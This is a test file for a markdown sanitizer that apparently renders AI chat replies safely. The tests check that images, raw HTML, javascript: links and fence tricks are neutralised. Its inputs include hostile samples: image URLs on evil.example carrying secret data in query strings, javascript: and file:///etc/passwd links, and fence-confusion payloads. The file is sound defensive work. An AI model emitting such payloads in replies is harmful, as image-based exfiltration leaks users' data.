import { describe, expect, test } from "bun:test";
import { escapeMarkdown, hostOf, safeUrl, sanitizeMarkdown } from "../src/core/sanitize";

const ROOT = "/Users/me/Pictures/AI Chat";
const clean = (text: string) => sanitizeMarkdown(text, { imageRoots: [ROOT] });

// No image syntax and no HTML tag start survives outside fenced code, whatever shape the attack takes.
function assertInert(output: string) {
  let fenced = false;
  for (const line of output.split("\n")) {
    if (/^ {0,3}(```|~~~)/.test(line)) fenced = !fenced;
    if (fenced) continue;
    const text = line.replace(/`[^`]*`/g, "");
    expect(text.replace(/\\./g, ""), line).not.toMatch(/!\[/);
    expect(text.replace(/\\./g, ""), line).not.toMatch(/<[A-Za-z/!?]/);
  }
}

describe("safeUrl", () => {
  test("keeps https, lower-cases the host, and drops tracking parameters", () => {
    expect(safeUrl("https://Example.COM/a/b?x=1&utm_source=n&fbclid=z&utm_medium=m#top")).toBe("https://example.com/a/b?x=1#top");
    expect(safeUrl("https://example.com/?utm_source=a")).toBe("https://example.com/");
    expect(safeUrl("https://sub.example.co.uk:8443/p")).toBe("https://sub.example.co.uk:8443/p");
  });

  test("refuses http, other schemes, credentials, odd hosts, and unsafe characters", () => {
    for (const bad of ["http://example.com/", "javascript:alert(1)", "file:///etc/passwd", "data:text/html,x", "ftp://example.com", "//example.com/x", "https://user:pw@example.com/", "https://localhost/", "https://127.0.0.1x/", "https://exa mple.com/", "https://example.com/a b", "https://example.com/<x>", 'https://example.com/"x', "https://exämple.com/", "https://[::1]/", "", "https://"]) {
      expect(safeUrl(bad), bad).toBeNull();
    }
  });

  test("hostOf drops www and the port", () => {
    expect(hostOf("https://www.Example.com:8443/x")).toBe("example.com");
  });
});

describe("escapeMarkdown", () => {
  test("a title cannot start markup", () => {
    expect(escapeMarkdown("A [link](x) <b>*bold*</b>\n![i](y)")).toBe("A \\[link\\]\\(x\\) \\<b\\>\\*bold\\*\\</b\\> \\!\\[i\\]\\(y\\)");
    expect(escapeMarkdown("x".repeat(300)).length).toBe(201);
  });
});

describe("images are never rendered", () => {
  test("an inline image becomes visible text with its full address", () => {
    expect(clean("hi ![x](https://evil.example/p.png?q=secret%20data) there")).toBe("hi 🖼 image not loaded: `https://evil.example/p.png?q=secret%2520data` there");
    expect(clean("![](http://evil.example/a)")).toBe("🖼 image not loaded: `http://evil.example/a`");
    expect(clean("![a](//evil.example/a)")).toBe("🖼 image not loaded: `//evil.example/a`");
    expect(clean("![a](data:image/png;base64,AAAA)")).toBe("🖼 image not loaded: `data:image/png;base64,AAAA`");
    expect(clean("![a](<https://evil.example/a b> \"title\")")).toBe("🖼 image not loaded: `https://evil.example/a%20b`");
  });

  test("reference-style images, collapsed and shortcut forms, and the definition line", () => {
    const text = "Before\n\n![alt][ref]\n\n![ref][]\n\n![ref]\n\n[ref]: https://evil.example/pixel.gif?d=1 \"t\"\n\nAfter";
    const out = clean(text);
    expect(out.match(/🖼 image not loaded: `https:\/\/evil.example\/pixel.gif\?d=1`/g)).toHaveLength(3);
    expect(out).not.toContain("[ref]:");
    expect(out).toContain("Before");
    expect(out).toContain("After");
    assertInert(out);
  });

  test("an unresolved or unfinished image is escaped, never left as syntax", () => {
    expect(clean("![alt][nothing]")).toBe("\\![alt][nothing]");
    expect(clean("![alt](https://evil.example/?q=sec")).toBe("\\![alt](https://evil.example/?q=sec");
    expect(clean("![")).toBe("\\![");
  });

  test("images inside links and link labels", () => {
    const out = clean("[![x](https://evil.example/p.gif)](https://good.example.com/page)");
    expect(out).toBe("[🖼 image not loaded: `https://evil.example/p.gif`](https://good.example.com/page) (good.example.com)");
    assertInert(out);
  });

  test("the workflow's own pictures stay, only from the images folder", () => {
    expect(clean(`![](${ROOT}/20260101-aa.png)`)).toBe(`![](${ROOT}/20260101-aa.png)`);
    for (const bad of ["/etc/hosts", `${ROOT}/../../secret.png`, "/net/evil.example/x.png", `${ROOT}`, `${ROOT}/a](https://evil.example/x)`, "file:///x.png", `${ROOT}/x.png?a=1`]) {
      const out = clean(`![](${bad})`);
      expect(out, bad).toContain("🖼 image not loaded");
    }
    expect(sanitizeMarkdown(`![](${ROOT}/a.png)`)).toContain("image not loaded");
  });

  test("a folder name with parentheses or spaces still works, brackets do not", () => {
    expect(clean(`![](${ROOT}/a (1).png)`)).toBe(`![](${ROOT}/a (1).png)`);
    expect(clean(`![](${ROOT}/a [1].png)`)).toContain("image not loaded");
    expect(sanitizeMarkdown("![](/Users/me/Pictures/Mine (new)/a.png)", { imageRoots: ["/Users/me/Pictures/Mine (new)"] })).toBe("![](/Users/me/Pictures/Mine (new)/a.png)");
  });

  test("a fenced block shows markup as typed; inside an inline code span the image mark is escaped as a precaution", () => {
    expect(clean("use `![](x)` like this")).toBe("use `\\![](x)` like this");
    const fenced = "```md\n![](https://evil.example/x)\n<img src=x>\n```";
    expect(clean(fenced)).toBe(fenced);
  });
});

describe("raw HTML becomes text", () => {
  test("tags, comments, and declarations are escaped", () => {
    expect(clean('<img src="https://evil.example/p.gif">')).toBe('\\<img src="https://evil.example/p.gif">');
    expect(clean("<script>x()</script>")).toBe("\\<script>x()\\</script>");
    expect(clean("<!-- hidden -->")).toBe("\\<!-- hidden -->");
    expect(clean("<?php x ?>")).toBe("\\<?php x ?>");
    expect(clean('<a href="javascript:x">y</a>')).toBe('\\<a href="javascript:x">y\\</a>');
    expect(clean("1 < 2 and 3 <4")).toBe("1 < 2 and 3 <4");
  });

  test("an autolink stays only when it is a clean https address", () => {
    expect(clean("<https://example.com/a?utm_source=x>")).toBe("<https://example.com/a>");
    expect(clean("<http://example.com/>")).toBe("\\<http://example.com/>");
    expect(clean("<javascript:alert(1)>")).toBe("\\<javascript:alert(1)>");
    expect(clean("<mailto:a@b.co>")).toBe("\\<mailto:a@b.co>");
  });
});

describe("links", () => {
  test("https links stay, get their site shown, and lose tracking parameters", () => {
    expect(clean("[click](https://evil.example/x?utm_source=a&d=1)")).toBe("[click](https://evil.example/x?d=1) (evil.example)");
    expect(clean("[example.com](https://www.example.com/a)")).toBe("[example.com](https://www.example.com/a)");
    expect(clean("[a](https://example.com/p_(1) \"Title\")")).toBe("[a](https://example.com/p_%281%29) (example.com)");
  });

  test("other links become plain text followed by their address", () => {
    expect(clean("[x](http://example.com/)")).toBe("x (`http://example.com/`)");
    expect(clean("[x](javascript:alert(1))")).toBe("x (`javascript:alert(1)`)");
    expect(clean("[x](file:///etc/passwd)")).toBe("x (`file:///etc/passwd`)");
    expect(clean("[x](mailto:a@b.co)")).toBe("x (`mailto:a@b.co`)");
    expect(clean("[x](#section)")).toBe("x (`#section`)");
    expect(clean("[x](https://user:pw@example.com/)")).toBe("x (`https://user:pw@example.com/`)");
    expect(clean("[x][r]\n\n[r]: javascript:alert(1)")).toBe("x (`javascript:alert(1)`)\n\n");
  });

  test("a link with a newline before its address is still checked", () => {
    expect(clean("[x](\nhttp://example.com/)")).toContain("x (`http://example.com/`)");
  });

  test("brackets that are not links are left alone", () => {
    expect(clean("see [1] and [^note] and arr[0]")).toBe("see [1] and [^note] and arr[0]");
    expect(clean("[^1]: A footnote.")).toBe("[^1]: A footnote.");
  });
});

describe("definitions cannot be used behind the sanitizer's back", () => {
  test("definition-looking lines are removed or escaped, in lists and quotes too", () => {
    expect(clean("> [a]: http://evil.example/")).toBe(">");
    expect(clean("- [a]: http://evil.example/")).toBe("-");
    const odd = clean("[a]: not a definition here");
    expect(odd).toBe("\\[a]: not a definition here");
  });

  test("a definition that the transformation itself would create is escaped", () => {
    const out = clean("[[a]: http://evil.example/ x](y)");
    expect(out).not.toMatch(/^\[a\]:/m);
  });
});

describe("fences", () => {
  test("an unclosed fence is closed so it cannot swallow the next frame", () => {
    expect(clean("```js\ncode")).toBe("```js\ncode\n```");
    expect(clean("~~~\ncode")).toBe("~~~\ncode\n~~~");
  });

  test("a backtick fence with a backtick in its info line is not a fence", () => {
    const out = clean("```a`b\n![](https://evil.example/x)");
    expect(out).toContain("image not loaded");
  });

  test("an indented fence is not trusted: its content is still cleaned", () => {
    const out = clean("  ```\n![](https://evil.example/x)\n  ```");
    expect(out).toContain("image not loaded");
  });

  test("an indented opener must not make the next fence's content look like code", () => {
    // A viewer reads "   ```" as an opener and the next "```" as its closer, so what follows is not code at all.
    const out = clean("   ```\n```\n<img src=\"https://evil.example/t.gif\">\n![](https://evil.example/p.gif)\n```");
    expect(out).toContain("\\<img src=");
    expect(out).toContain("image not loaded");
    assertInert(out);
  });

  test("a fence inside a list item or a quote is not trusted either, and a lazy line cannot slip out of it", () => {
    for (const opener of ["- ```", "1. ```", "> ```", "   ~~~", "\t```"]) {
      const out = clean(`${opener}\n   code\nlazy ![](https://evil.example/p.gif) <img src=x>\n\`\`\`\n![](https://evil.example/q.gif)\n\`\`\``);
      expect(out, opener).not.toMatch(/(^|[^\\])!\[/);
      expect(out, opener).toContain("\\<img");
    }
  });

  test("a numbered list with an indented code block keeps its code exactly, and later code blocks too", () => {
    const text = "1. Install it:\n\n   ```ts\n   const a: Array<string> = [];\n   const b = `![](x)`;\n   ```\n\n2. Done.\n\n```html\n<div>\n```";
    expect(clean(text)).toBe(text);
  });

  test("an indented block that a less indented line breaks is not trusted, and the two readings then disagree", () => {
    const out = clean("   ```\n   <div>kept</div>\nbroken out <img src=x>\n```\n<img src=y>\n```\n<img src=z>\n```");
    expect(out).not.toMatch(/^ {0,3}(```|~~~)/m);
    expect(out).toContain("\\<img src=x>");
    expect(out).toContain("\\<img src=y>");
    expect(out).toContain("\\<img src=z>");
  });

  test("a fence that only a replaced link would create is closed so it cannot swallow the next frame", () => {
    const out = clean("[```\ncode](javascript:alert(1))");
    expect(out).toBe("```\ncode (`javascript:alert(1)`)\n```");
  });

  test("a link replaced at the start of a line cannot create an opener that flips the fences after it", () => {
    const out = clean("[~~~http://evil.example/x]()\n~~~\n<img src=\"https://evil.example/t.gif\">\n~~~");
    expect(out).toContain("\\<img src=");
  });

  test("replacing an inner image cannot leave an outer bracket pair that becomes a link", () => {
    const out = clean("<a href=![![!]([)&#60;img> ]([r]https://evil.example/p.gif?q=S)");
    expect(out).not.toMatch(/\]\(\[r\]/);
    assertInert(out);
    expect(clean("[x ![y]([) z](javascript:alert(1))")).not.toMatch(/\]\(javascript:/);
  });

  test("when the two readings of an indented fence cannot be reconciled, no fence is left at all", () => {
    // Top level, this ends in an open fence; inside a list item it ends in a different state.
    const out = clean("   ```\n~~~\nx\n\n   ```\n~~~\n<img src=x>");
    expect(out).toContain("\\<img src=x>");
    expect(out).not.toMatch(/^ {0,3}(```|~~~)/m);
  });

  test("a closing fence may be indented up to three spaces", () => {
    const out = clean("```\n![](x)\n   ```\n![](https://evil.example/x)");
    expect(out).toContain("![](x)");
    expect(out).toContain("image not loaded");
  });
});

describe("escapes, code spans, and stray syntax", () => {
  test("an escaped bracket or backtick does not start anything", () => {
    expect(clean("\\![x](https://evil.example/a) \\`![](https://evil.example/b)")).toContain("image not loaded: `https://evil.example/b`");
  });

  test("an unclosed code span does not hide markup", () => {
    expect(clean("`oops ![](https://evil.example/a)")).toContain("image not loaded");
  });

  test("CR line endings and private-use characters cannot hide a definition", () => {
    const out = clean("![a][r]\r[r]: https://evil.example/p\r");
    expect(out).toContain("image not loaded: `https://evil.example/p`");
    expect(clean("\uE000" + "0" + "\uE001")).toBe("0");
  });

  test("deeply nested labels stay bounded", () => {
    const text = `${"[".repeat(40)}x${"]".repeat(40)}(https://evil.example/a)`;
    expect(() => clean(text)).not.toThrow();
  });
});

describe("streaming: every prefix of a hostile reply is inert", () => {
  const reply = [
    "Here is the answer.",
    "![a](https://evil.example/p.gif?q=SECRET)",
    "<img src=\"https://evil.example/q.gif\">",
    "![b][r]",
    "[r]: https://evil.example/r.gif",
    "[click](javascript:alert(1)) and [ok](https://example.com/?utm_source=z)",
    "```",
    "![in code](https://example.com/x)",
    "```",
    "<a href='http://evil.example'>x</a>",
  ].join("\n");

  test("no prefix leaves image syntax or a tag outside code, and the whole never links to http or javascript", () => {
    for (let n = 0; n <= reply.length; n++) {
      const out = clean(reply.slice(0, n));
      assertInert(out);
    }
    const whole = clean(reply);
    expect(whole).not.toMatch(/\]\(http:/);
    expect(whole).not.toMatch(/\]\(javascript:/);
    expect(whole).toContain("[ok](https://example.com/) (example.com)");
  });

  test("the same text arriving in chunks gives the same final view as arriving whole", () => {
    let seen = "";
    for (const chunk of reply.match(/[\s\S]{1,7}/g)!) seen += chunk;
    expect(clean(seen)).toBe(clean(reply));
  });
});
